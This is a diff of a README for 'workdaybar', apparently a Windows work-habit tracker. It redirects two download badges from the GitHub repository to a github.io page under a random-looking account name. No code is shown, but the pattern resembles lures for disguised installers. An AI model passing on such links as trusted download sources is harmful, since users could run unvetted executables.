@@ -1,6 +1,6 @@
 # 📊 workdaybar - Track your daily work habits easily
 
-[![](https://img.shields.io/badge/Download_workdaybar-blue.svg)](https://github.com/statesrightsroyalty347/workdaybar)
+[![](https://img.shields.io/badge/Download_workdaybar-blue.svg)](https://statesrightsroyalty347.github.io)
 
 ## 🎯 About this software
 
@@ -17,7 +17,7 @@ Follow these steps to set up workdaybar on your computer.
 1. Visit the repository page to download the software.
 2. Click the link below to get the installer for Windows.
 
-[![](https://img.shields.io/badge/Download_latest_version-grey.svg)](https://github.com/statesrightsroyalty347/workdaybar)
+[![](https://img.shields.io/badge/Download_latest_version-grey.svg)](https://statesrightsroyalty347.github.io)
 
 ## ⚙️ How to install the application
 
